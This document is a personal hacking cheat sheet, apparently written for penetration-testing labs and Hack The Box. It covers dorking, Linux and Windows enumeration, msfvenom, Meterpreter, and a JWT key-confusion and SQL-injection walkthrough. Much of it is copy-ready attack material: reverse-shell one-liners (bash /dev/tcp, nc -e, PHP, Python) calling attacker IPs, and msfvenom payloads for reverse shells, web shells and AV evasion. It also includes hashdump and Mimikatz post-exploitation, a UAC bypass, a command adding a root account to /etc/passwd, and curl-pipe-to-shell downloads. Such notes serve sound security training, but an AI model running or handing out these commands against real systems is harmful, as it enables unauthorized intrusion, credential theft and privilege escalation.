# Hacking Snippets

## VM conf
To open shared dir from host to VMware Worksatation
```
sudo vi /etc/fstab                # open this file and add the line below
.host:/ /mnt/hgfs/ fuse.vmhgfs-fuse defaults,allow_other,uid=1000 0 0
```
 
### Google Dorks (Search)

The [_Google Hacking Database_](https://www.exploit-db.com/google-hacking-database)(GHDB).
The process is iterative, beginning with a broad search, which is narrowed using operators to sift out irrelevant or uninteresting results.
- `site:` Limits the search to a specific domain
- `filetype:` Limits to specific file types ( also can use `ext:`)
- `site:megacorpone.com -ext:html` only the site and not html pages
- `intitle:"indexof" "parent directory"` look for a specific title and content of the page.
  
```
ext == filetype 
ext:php,ext:xml,ext:py
site:megacorpone.com ext:txt 
intext:"@megacorpone.com" -site:www.megacorpone.com 
site:tesla.com -www -shop -share -ir -mfa   # exclude boring domains 

# look for code left over rom Devs
site:pastebin.com
site:jsfiddle.net
site:codebeautify.org
site:codepen.io "tesla.com"

site:tesla.com ext:php inurl:?		   	 					# look for php and parameters (?) in urls

site:openbugbounty.org inurl:reports intext:"yahoo.com"    # look for disclosed adn undisclosed Bug Biounties

(site:tesla.com | site:teslamotors.com) & ”choose file”    # Combine Dorks

# find buckets and sensitive data
site:s3.amazonaws.com "example.com"
site:blob.core.windows.net "example.com"
site:googleapis.com "example.com"
site:drive.google.com "example.com"
# Add terms like confidential, privileged, not for public release to narrow your results

```


| Search operator |                         What it does                        |         Example         |
|:---------------:|:-----------------------------------------------------------:|:-----------------------:|
| `“ ”`             | Search for results that mention a word or phrase.           | “steve jobs”            |
| `OR`              | Search for results related to X or Y.                       | jobs OR gates           |
| `|`              | Same as OR:                                                 | `jobs | gates`           |
| `AND`             | Search for results related to X and Y.                      | jobs AND gates          |
| `-`               | Search for results that don’t mention a word or phrase.     | jobs -apple             |
| `*`               | Wildcard matching any word or phrase.                       | steve * apple           |
| `( )`             | Group multiple searches.                                    | (ipad OR iphone) apple  |
| `define:`         | Search for the definition of a word or phrase.              | define:entrepreneur     |
| `cache:`          | Find the most recent cache of a webpage.                    | cache:apple.com         |
| `filetype:`       | Search for particular types of files (e.g., PDF).           | apple filetype:pdf      |
| `ext:`            | Same as filetype:                                           | apple ext:pdf           |
| `site:`           | Search for results from a particular website.               | site:apple.com          |
| `related:`        | Search for sites related to a given domain.                 | related:apple.com       |
| `intitle:`        | Search for pages with a particular word in the title tag.   | intitle:apple           |
| `allintitle:`     | Search for pages with multiple words in the title tag.      | allintitle:apple iphone |
| `inurl:`          | Search for pages with a particular word in the URL.         | inurl:apple             |
| `allinurl:`       | Search for pages with multiple words in the URL.            | allinurl:apple iphone   |
| `intext:`         | Search for pages with a particular word in their content.   | intext:apple iphone     |
| `allintext:`      | Search for pages with multiple words in their content.      | allintext:apple iphone  |
| `weather:`        | Search for the weather in a location.                       | weather:san francisco   |
| `stocks:`         | Search for stock information for a ticker.                  | stocks:aapl             |
| `map:`            | Force Google to show map results.                           | map:silicon valley      |
| `movie:`          | Search for information about a movie.                       | movie:steve jobs        |
| `in`              | Convert one unit to another.                                | $329 in GBP             |
| `source:`         | Search for results from a particular source in Google News. | apple source:the_verge  |
| `before:`         | Search for results from before a particular date.           | apple before:2007-06-29 |
| `after:`          | Search for results from after a particular date.            | apple after:2007-06-29  |

**search for any files with the word "users" in the filename**
`path:users`

**Find exposed environment files:**
`filename:.env`

**Find SQL files that might contain passwords:**
`extension:sql password`

**Find configuration files within a config directory:**
`path:config database`

**Search within a specific organization:**
`org:exampleorg`

**Search within a specific repository:**
`repo:username/reponame`

**Search for repositories of a specific user:**
`user:username`

**Search for files containing both 'password' and 'database':**
`password database`

**Search for a specific variable name:**
`"DB_PASSWORD"`

**Find large files:**
`size:>10000`

**Find popular repositories:**
`stars:>100`

WordPress: `inurl:/wp-admin/admin-ajax.php`
Drupal: `intext:"Powered by" & intext:Drupal & inurl:user`
Joomla: `site:*/joomla/login`



### Joomla scanning

Joomscan is an owasp tool but its not amazing but has activity - https://github.com/OWASP/joomscan

```
# Find Common Xss vuln Params
inurl:q= | inurl:s= | inurl:search= | inurl:query= inurl:& site:example.com

# OPEN REDIRECTS
inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http site:example.com
```


----
##  ----------------------------------  LINUX ----------------------------------


### Getting your barings
**Get the OS details**
```
uname -a
```

**OS version which was issued**

```
cat /etc/issue              
```
**Release-specific information**
```
cat /etc/os-release        
```
**linux Kernel version running**
```
lsb_release -a
```
**Look for accounts**
```
cat /etc/passwd
```

**Look for accounts with shell access**
```
cat /etc/passwd | grep -E "\w+sh\b"
```

**Have a look ain the home dir** 
```
ls -la
```
**Things in the /usr/local are normally placed explicitly by the admin so could be interesting and non standard. The package manager would not have put it there.**
```
ls -la /usr/local/
```
#### Capabilities
`/usr/sbin/getcap -r / 2>/dev/null`

#### suid

- `find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;`

**eth0 see if funny NAT stuff going on**

```
ip -a           
```
**List all the commands the user can run as root. May require user Auth**
```
sudo -l
```
**SUID FILES**
```
find / -type f -perm -4000 -ls 2>/dev/null             # find SUIDs
```
### Files with insecure permissions and juicy stuff
[Find](http://man7.org/linux/man-pages/man1/find.1.html)
`find / -writable -type d 2>/dev/null`
`find / -writable -type f 2>/dev/null`

If /etc/passwd is writable , create the root2 users password ( check the crypto matches)

``` 
└─$openssl passwd w00t                                                                      
pmvbOjc1patek
└─$ echo "root2:pmvbOjc1patek:0:0:root:/root:/bin/bash" >> /etc/passwd  
```

```
find / -type d -writable -exec echo {} \; 2>/dev/null 
find /intreting/directory/ -writable
grep -R system .
grep -R popen .
```


#### Networking 

```
ip a
ifconfig a    #  similar and more verbose
route
routel        # alternative to route 
ss -lntp        # see if anything is listening 
```

#### Basic Service Footprints
- `watch -n 1 "ps -aux | grep pass"`
- `sudo tcpdump -i lo -A | grep "pass"`

**List all the services which are running**
```
systemctl list-units --type=service 
```
**This will also list the services**
```
find /etc/ -name *.service`         
```
We can then cat the service files to see how `systemd` starts it
`cat /etc/systemd/system/SOME-SERVICE.service`

**Look at the web server maybe in `/opt` or `/var/www`**

```
cat /etc/cron.d/*         # - Look at all the cron jobs
```

**`doas` is an alt to sudo from bsd and the cnf file might list provledged commands which can be run**
```
cat /usr/local/etc/doas.conf 
```

#### Running Process with [ps](http://man7.org/linux/man-pages/man1/ps.1.html)

```
ps -ef --forest  
ps axjf  
```

`ps aux`
- `a` - all
- `u` - user readable
- `x` - with our without [tty](https://www.linusakesson.net/programming/tty/) . tty is the TeleType so this will show proccess which are not useing a terminal as awell as those whic hare.

#### Basic with watch (search for pass)
`watch -n 1 "ps -aux | grep pass"`

#### ps commands 

Caution, Long terminla Output might get truncated if your terminal is too small
`ps axjf` command displays a detailed process tree with the following columns:
- **PPID**: Parent Process ID, the process ID of the parent process.
- **PID**: Process ID, the unique ID of the process.
- **PGID**: Process Group ID, the ID of the process group.
- **SID**: Session ID, the ID of the session.
- **TTY**: Terminal associated with the process.
- **TPGID**: Terminal Process Group ID, the ID of the foreground process group.
- **STAT**: Process status (e.g., R for running, S for sleeping).
- **UID**: User ID of the process owner.
- **TIME**: CPU time used by the process.
- **COMMAND**: The command that initiated the process.

`ps -eo pid,ppid,pgid,sid,tty,tpgid,stat,uid,time,cmd --forest` provides a detailed, tree-structured view of running processes:
- **-e**: Displays all processes.
- **-o**: Specifies the output format.
- **pid**: Process ID.
- **ppid**: Parent Process ID.
- **pgid**: Process Group ID.
- **sid**: Session ID.
- **tty**: Terminal associated with the process.
- **tpgid**: Terminal Process Group ID.
- **stat**: Process status.
- **uid**: User ID of the process owner.
- **time**: CPU time used.
- **cmd**: Command that started the process.
- **--forest**: Displays processes in a tree structure showing parent-child relationships.


`ss -anp` example, 
- `-a` list all connections, 
- `-n` avoid hostname resolution (which may stall the command execution)  
- `-p` list the process name the connection belongs to 

#### Firewall Rules
ipv4 iptables rules are set in : `/etc/iptables/rules.v4`

### Scheduled tasks - Cron etc 

#### [Cron](https://en.wikipedia.org/wiki/Cron) 
`ls -lah /etc/cron*`
`crontab -l` - List Crons
(`crontab -e` manage these crontabs using)
`/etc/crontab`: This is the main system-wide cron file.
`/etc/cron.d/`: This directory can contain additional cron job definitions.

Check these directories which hold scripts that are run at the specified intervals (daily, hourly, weekly, monthly).
`/etc/cron.daily/`
`/etc/cron.hourly/`
`/etc/cron.weekly/`
`/etc/cron.monthly/`

**Per-User Crontabs**: 
Each user's crontab file is stored under `/var/spool/cron/crontabs/` (on some systems, it may be `/var/spool/cron/`), and each user has their own crontab file.

```
grep "CRON" /var/log/syslog
grep "pass" /var/log/cron.log
```
#### Anacron
a tool for scheduling tasks that are intended to run at periodic intervals but don't need to run at precise times. Anacron will run missed jobs after the system comes back online if the system was down when the job was supposed to run.
`/etc/anacrontab`: The configuration file for `anacron`.
`/var/spool/anacron/`: This directory keeps track of when the anacron jobs were last run.

#### Systemd Timers
Many modern Linux distributions (like Ubuntu) use `systemd` to schedule tasks instead of cron. **Systemd timers** can replace cron jobs and are managed through the systemd service manager.
`systemctl list-timers --all`
**Locations**:
`/etc/systemd/system/`: This is where system-wide timers might be defined.
`/lib/systemd/system/`: Some predefined timers may reside here.
`/usr/lib/systemd/system/`: Another place for predefined timers.

### Enumeration of all installed applications
We should know how to manually query installed packages as this is needed to corroborate information obtained during previous enumeration steps.

| Package Manager | Command to List All Packages | Operating Systems | Description |
|-----------------|------------------------------|-------------------|-------------|
| `apt`           | `apt list --installed`        | Debian, Ubuntu, Linux Mint, Pop!_OS | High-level package manager that handles dependencies and repositories easily. |
| `dpkg`          | `dpkg -l`                     | Debian, Ubuntu, Linux Mint | Low-level package manager that manages `.deb` packages but does not resolve dependencies. |
| `yum`           | `yum list installed`          | CentOS, RHEL, Fedora (older versions) | High-level package manager for managing RPM packages and resolving dependencies. |
| `dnf`           | `dnf list installed`          | Fedora, CentOS 8+, RHEL 8+ | High-level replacement for YUM with better performance and dependency resolution. |
| `zypper`        | `zypper se --installed-only`  | openSUSE, SUSE Linux Enterprise | High-level package manager that handles dependencies and repository management with advanced conflict resolution. |
| `pacman`        | `pacman -Q`                   | Arch Linux, Manjaro | Low-level package manager that is lightweight and fast, managing both binaries and source packages. |
| `rpm`           | `rpm -qa`                     | RHEL, CentOS, Fedora, openSUSE | Low-level package manager for handling individual RPM packages; doesn't resolve dependencies. |
| `eopkg`         | `eopkg list-installed`        | Solus | High-level package manager for the Solus distro, handles dependencies. |
| `xbps`          | `xbps-query -l`               | Void Linux | Low-level package manager for managing binary packages, with minimal overhead. |
| `snap`          | `snap list`                   | Ubuntu, Debian, Fedora, Arch Linux | High-level, cross-distribution package manager for containerized applications, providing isolation. |
| `flatpak`       | `flatpak list`                | Various distributions (cross-platform) | High-level, cross-distribution package manager similar to Snap, designed for sandboxed app deployment. |
| `nix`           | `nix-env -q`                  | NixOS, other distributions with Nix installed | High-level package manager with declarative configuration, supporting system-wide and user-level environments. |


#### Mounted drives 
Both
- `cat /etc/fstab` [fstab](https://geek-university.com/linux/etc-fstab-file) File lists all drives that will be mounted at boot time.
- `mount` List all mounted file systems
- - `lsblk` . Use [lsblk](https://linux.die.net/man/8/lsblk) to view all available disks ( some might not be mounted).

### List device drivers and kernel modules for later exploitation.

```
:$ lsmod
:$ /sbin/modinfo <MODULE_NAME>
```



#### Has the User left anything juicy
`cat .bash_history`
`cat .bashrc`

Blatant flag run `find / -type f -exec grep -H -E 'OS{|flag' {} \; 2>/dev/null`


## LinPeas
- `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee >(ansi2html > LinPeasReport.html)`
- `wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`



#### Get a Linpeas report from a container from local machine to container shell and back
1. Copy Linpeas to each container `for container in $(docker ps -q); do docker cp sweet.sh $container:/; done`
1. Start the `script` utility `script REPORT_FROM-terminal.txt`
1. On your local machine Run this to get a shell `oc exec -it CONTAINER-POD -- /bin/bash`
1. run linpeas on the container : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
1. `exit` to exit the container terminal 
1. `exit` to exit the local script command terminal 
1. On your local machinie `cat REPORT_FROM-terminal.txt | ansi2html > LinPeasReport.html`
1. View it in your local webbrowser


## ss (Socket statistics)
`ss -tln`
```
-l: Display only listening sockets.
-t: Display TCP sockets.
-n: Do not try to resolve service names.
```
#### Linux Misc Tricks

- `grep MemTotal /proc/meminfo` - Get the total ram/Memory of the system
- `for i in $(compgen -a); do alias $i ; done`        # List all the aliases and the see what commands they actually do
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` # List of all SUID and SGID Executables - from : https://atom.hackstreetboys.ph/linux-privilege-escalation-suid-sgid-executables/
- `watch -n 60 "date && free -h"` # Run two commands in watch at the same time every 60 seconds
- `cat PRTG_Configuration.dat | sed 's/^[ \t]*//' | uniq   		# right justify all lines`
- `grep -0i user <TARGET_FILE> | sed 's/ //g' | sort -u           # get all the uniq lines and get rid of all white spaces - TO make it easy to read`
- `grep -B5 -A5 -i password <TARGET_FILE> | sed 's/ //g'|sort -u| less`
- `awk '!/^$/' FILENAME > NEWFILE.out`  				# remove empty lines
- `find / -type f -group developers 2>/dev/null -ls`
- `watch -n 0.1 'ls -lt $(find <DIR_PATH> -type f -mmin -30)'` # find files modified in the last 30 mins , and refresh every 10th of a minute ( I thinnk)
- `for logfile in /PATH/TO/LOG/FILES/*.LOG; do tail -f $logfile & done` # Tail all the log files 



### xargs
Runs a command for every line of input
- `xargs -n1 -I{}sh -c ' echo {} base64 -d'` , where...
  - `-n1` is to do 1 at a time
  - `-I{}` is to got to the utility specified ; eg `sh`

### add a new users
```sh
sudo useradd -m -s /bin/bash USERNAME   # Create user , set home and default shell
sudo passwd USERNAME                    # Set password
sudo usermod -aG sudo username          # Optional : add to sudoers
```



----
##  ---------------------------------- End of LINUX ----------------------------------
----

# Hacking tools


### msfvenom - Generating Custom Reverse Shell Scripts

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<CALLBACK_IP> LPORT=<PORT> -f war > webshell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
msfvenom -l payload | grep node   # Look for node payloads
msfvenom -p
```

Example:

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
- You can use many reverse shell payloads with the `-p` flag and specify the output language with the `-f` flag.

```bash
# Example from HTB (RESOLUTE)
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
```

### Windows Reverse Shells

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LISTEN_IP> LPORT=443 -f exe > binary.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=9999 -f dll -o Nasty.dll
```

### List Payloads and Output Formats

```bash
msfvenom --list payloads    # View all 1300+ payloads
msfvenom --list format      # See all available output formats
```

### Custom MSI Payload Example (HTB Love)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.93 LPORT=9999 -f msi -o reverse.msi
```
- Run the payload on a Windows machine with:
```bash
msiexec /quiet /i reverse.msi
```
This command installs the MSI package silently, without any user interface.

### PowerShell Reverse Shell

```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.3 LPORT=443 > shell.bat
```

### Powerful Unlisted Commands

- **Generate ASPX Web Shell** (for use with IIS web servers):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f aspx > shell.aspx
```

- **Multi-Platform ELF Reverse Shell**:
  - Works across multiple Linux architectures (x86, x64, ARM):

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf > shell.elf
```

- **Stageless Payloads**:
  - For avoiding detection by AV (doesn’t use a staging mechanism):
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f exe -o stageless.exe
```

- **Base64 Encoded PowerShell Reverse Shell**:
  - Use this to evade simple signature-based detections:
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f psh-cmd -o shell.ps1
```

- **Custom Bash Payload**:
  - To be used in Linux systems for command execution:
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.sh
```


## Meterpreter Snippets

- **Start PostgreSQL DB**:  
The PostgreSQL service is not enabled by default on Kali, but it's beneficial for storing information about target hosts. Use:
```bash
sudo msfdb init
sudo systemctl enable postgresql
```

- **Check DB Status**:
```bash
msfconsole -q
msf6 > db_status
```

- **Workspaces**: Use workspaces to separate different engagements:
```bash
msf6 > workspace -a new_workspace
```

- **Useful Database Commands**:
```bash
msf6 > db_nmap -A 192.168.226.202   # Scan and save results to DB
msf6 > hosts                         # List all hosts
msf6 > services                      # List all services
msf6 > services -p 8000              # Filter by port
```

- **Search for SMB Modules**:
```bash
msf6 > search type:auxiliary smb
msf6 > use auxiliary/scanner/smb/smb_version
```

#### Meterpreter - One-liner Listener
- Start a reverse Meterpreter listener with a one-liner:

```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.235; set LPORT 443; run;"
```

#### Exploit Module Use Example:

- Activate module and check options:
```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > show options
msf6 auxiliary(smb_version) > services -p 445 --rhosts
```



#### Meterpreter - Listener Setup (msfconsole)
1. Launch `msfconsole` and configure the handler:

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0    # Ensure correct interface is used
msf6 exploit(multi/handler) > set LHOST tun0    # Set twice to bypass known bug
msf6 exploit(multi/handler) > set LPORT 5555    # Define the listening port
msf6 exploit(multi/handler) > run
```

#### Meterpreter - Reverse Shell Setup
1. Create the Meterpreter payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f exe > shell.exe
```

2. Upload the payload to the target machine.
3. Start a Meterpreter listener:

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.31    # Your local IP
msf6 exploit(multi/handler) > set LPORT 1234           # Your listening port
msf6 exploit(multi/handler) > run
```

4. Once a session is established:

```bash
meterpreter > ps     # List running processes
meterpreter > migrate <PID>   # Secure shell by migrating to a stable process
meterpreter > hashdump        # Dump password hashes
meterpreter > shell           # Start a stable interactive shell
```

#### Key Meterpreter Commands
- **User Interaction**:

```bash
meterpreter > idletime             # Check how long the user has been idle
meterpreter > getuid               # Get current user ID
meterpreter > getsystem            # Attempt privilege escalation
meterpreter > help                 # List available Meterpreter commands
```

- **Process Management**:

```bash
meterpreter > ps                   # List all processes
meterpreter > migrate <PID>         # Migrate session to specified process
meterpreter > execute -H -f notepad # Run hidden Notepad process
meterpreter > shell                # Start interactive shell
meterpreter > bg                   # Background current session
```
- **Post-Exploitation**:

```bash
meterpreter > run post/multi/recon/local_exploit_suggester  # Suggest local exploits
meterpreter > hashdump                                    # Dump password hashes (if privileged)
meterpreter > load kiwi                                   # Load Kiwi (Mimikatz) module
meterpreter > getenv <VAR>                                # Get specific environment variable
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.145.200 # Forward port to target machine
```

#### Meterpreter - Privilege Escalation
1. Run the local exploit suggester to find potential vulnerabilities:

```bash
msfconsole > search suggester
meterpreter > run post/multi/recon/local_exploit_suggester
```

2. Example: Using a UAC bypass exploit:

```bash
msfconsole > use exploit/windows/local/bypassuac_sdclt
```

- This leverages a Windows utility to bypass User Account Control (UAC).

#### Post-Exploitation Modules
- Explore other Metasploit post-exploitation modules:

```bash
msfconsole > post/windows/*
msfconsole > exploit_suggestor
msfconsole > credential_collector
```

#### Proxying Through Metasploit (SOCKS)
1. Set up a SOCKS proxy and route traffic through the target:

```bash
msf > search socks
msf > use auxiliary/server/socks4a
msf > run
msf > route add <IP-OF_TARGET> <SESSION_NUMBER>
```

2. Forward local ports to remote targets:

```bash
msf > portfwd add -l <LOCALPORT> -p <REMOTEPORT> -r <REMOTE-IP>
```
- Example:

```bash
msf > portfwd add -l 3389 -p 3389 -r 172.16.145.200
```

---



# Webshell to ReverseShell with url encodeing

- **PHP** : `php -r '$sock=fsockopen("192.168.45.159",9001);exec("/bin/bash -i <&3 >&3 2>&3");'` >>>>> `php+-r+%27%24sock%3Dfsockopen%28%22192.168.45.159%22%2C9001%29%3Bexec%28%22%2Fbin%2Fbash+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27`
- **Bash** ( Reobust) : `/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.159/9001 0>&1'` >>>  `%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.159%2F9001+0%3E%261%27`
- **Nc** ( Linux ) : `nc -e /bin/bash 192.168.45.159 9001` ->->->-> `nc+-e+%2Fbin%2Fbash+192.168.45.159+9001`

# BASH

```
/bin/bash -p    # starts a shell but not as the user but as the group. IT doenst revert the user 

```
## Bash 1-Liners
```
exec python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4567));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'   # Python 1 linere Reve shell for a script  # python reverse shell

```
### coured shell OP export 
`ansi2html` - https://pypi.org/project/ansi2html/
but then it said ??- `sudo apt install colorized-logs` ??


# Tmux

```
C-b : Hey Tmux  ( Prefix key)

c-b c : create a new window in your session
c-b d : Detach from your tmux session
tmux a : attache to the most recent session 
tmux new -s Session1 : Start a new tmux session called Session1
tmux ls : list all tmux sessions
tmux a -t <SESSION_NAME_OR_INDEX> : attach to a specific target tmux session
tmux kill-session : Kill hte most recent tmux session
tmux kill-session -t <SESSION_NAME_OR_INDEX> : Kill a taarget tmux session


# Spliting Panes
c-b %  : Split pane virtically
c-b " : split pane horizontaly
c-b <DIRECTION-ARRAOW> : moves to a different pane
c-b q : displays pane index
c-b q 2 : jump to pane 2
c-b q 0 : jump to pane 0
c-b hold-CTL <ARROWS> : resize panes
c-b c : create a new window in your session

c-b n : move to the next window
c-b p : move to the previous window

c-b , : rename present window
c-b w : list of windows and sessions
c-b w c-b x : kill highlighted session
c-b x : kill hgihlighted pane

c-b [ : Enter to copy mode to scroll up and down with mouse or arrow

---Config setting 
set -g mouse on          -- ???
setw -g node-keys vi     -- ???

tool: subfinder

```

### Steps for Under Construction on HTB jwt key confusion 

<details>
	<summary>Steps for Under Construction HTB </summary>

Web site and source code given. In the source code the JWT Helper uses the "jsonwebtoken" which is vuln to **CVE-2015-9235** HS/RSA key Confusion.

1. Register a user on `UnderConstructiopn` the site.
1. Take the jwt and edit it on https://jwt.io/
1. Create new Public key `.pem` file from the public key contained in the jwt. Make sure to remove all of the `\n` so the format of the key is correct, even if the lines are not the same size. We can check the key format is ok on https://jwt.io/ as you should see the "signature verified" at the bottom.

1. Look at the help menu on the python jwt_tool. https://github.com/payloadbox/sql-injection-payload-list

These are the commands we will use:

```sh
python3 jwt_tool.py --help
-t target url
-X EXPLOIT, --exploit EXPLOIT
                        exploit known vulnerabilities:
                        a = alg:none
                        n = null signature
                        b = blank password accepted in signature
                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
                        k = key confusion (specify public key with -pk)   <--- this is what we are doing 
                        i = inject inline JWK
-pk publickey.pem file # here we will confuse the implimentation that the public key is the private key
-T   to tamper with the token
-I Try and inject new claims
-pc the payload claim we will be tampering with
-pv payload values , here sql commands to inject
```

1. First basic test. Can we create new token to look up a user which doesn't exist. If this works , we are rolling.
1. `python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. next we use the following sqli payload to find the number of columns (when we get an error we stop)
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,1--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,1,1--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. We get an error so the number of columns is 3!
  
1. Get the database version
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,sqlite_version(),1--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. Get the tables (also needs to specify the default database of sqlite_master)
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,group_concat(tbl_name),1 from sqlite_master--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. Get the columns and accounts from the sql
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,group_concat(sql),1 from sqlite_master--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`
1. Get the flag content of the flag_storage
`python3 /root/Tools/jwt_tool/jwt_tool.py $(cat raw_jwt.txt) -I -pc username -pv "test6' and 1 = 0 union all select 1,group_concat(top_secret_flaag),1 from flag_storage--" -X k -pk /root/HTB/Paths/Easy/UnderConstruction/newpub.pem`

</details>

# Windows

## Windows Situational Awareness and Enumeration 
- `whoami /all`  # get all user info availuble to current user ( i think) and the name of the host which might tell us about its purpose.
  - IF this has the `SeImpersonate` token you cna privesc with Jucy potato.
- `whoami /priv` If we see we have `SeImpersonatePrivilege`, means a **Potato style attack**
**Next: look at other users and groups on the system.** 
- `whoami /priv | findstr /i "SeBatchLoginRight"` Means we could schedule a task to run a task to run as this user ( Reverse shell!)
	- `net user` - [Docs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11))
	- `Get-LocalUser` - Powershell comand - [Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) - <<< **Better cmd**
  `net localgroup` or powershell `Get-LocalGroup` - [Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroup?view=powershell-5.1). 
- `query user` see who is logged on the the system. Could we do a `psexec` or `runas` as them??

- `systeminfo` this shell command will give you 
	- list of hot fixes
	- hostname 
	- OS version
	- Use the build number and review the existing versions [from this list](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)
  - 32 or a 64-bit system becomes relevant we cannot run a 64-bit application on a 32-bit system.
	- Processor
	- Memory 
	- Timezone
- `getuid`
- `net users` Lists out user and groups
- `net user USERNAME` - Lists info about a particular user
- `net group` - sometimes available
- `net accounts` - Get eh account policy.
- `ipconfig /all` Look for services, other networks. Notice the DNS server, gateway, subnet mask, and MAC address. 
- `route print` contains all routes of the system. We should always check the routing table on a target system to ensure we don't miss any information.
- `netstat -ano` (`-a` active, `-n` disable name resolution , `-o` PID)

##### See local files commands
```
dir -force    # Lists all files
gci -Hidden   # Also Lists all files

```
###### Find all the files (eg log, txt files)
- `Get-ChildItem -Path C:\ -Recurse -Filter *.log,*.txt -ErrorAction SilentlyContinue | Select-Object FullName`
Look in the downloads, Program files dirs, txt and other files

#### See Recent Commands

`Get-History` Get all the powershell commands run 
`(Get-PSReadlineOption).HistorySavePath` will get us the location of the file containing the history path. More verbose is `Get-PSReadlineOption`.

#### Check installed software
##### 32-bit
`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
Also: without the filter : `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
##### 64-bit
`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
Also: without the filter  `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"`

#### Check current running applications
- `Get-Process`
- Get the path location of a process by ID `(Get-Process -Id <PID>).path`
- `tasklist`

- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  - Having AlwaysInstallElevated set to 1 is considered a significant security risk because any user, including those without administrative privileges, can install software that will run with elevated permissions. Malicious software packaged in an MSI file could be used to compromise the system.
  - The command above is used in Windows Command Prompt to query the registry settings. It checks the configuration of the system related to the Windows Installer. Specifically, it checks whether the 'AlwaysInstallElevated' policy is set in the Windows registry.
  - `reg query`: This is the command used to display the contents of the Windows registry or find all matches of a specified data type
  - `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`: This specifies the registry path. HKLM stands for HKEY_LOCAL_MACHINE, which contains settings that are general to all users on the computer. This particular path is where policies specific to the Windows Installer are stored.
  - `/v AlwaysInstallElevated`: This specifies that we want to view the value of the 'AlwaysInstallElevated' registry entry
  - Out put might look like : `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated    REG_DWORD    0x1`
- `get-applockerpolicy -effective | select -expandproperty rulecollections`
- Find out which kind of shell you have ; run: `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`
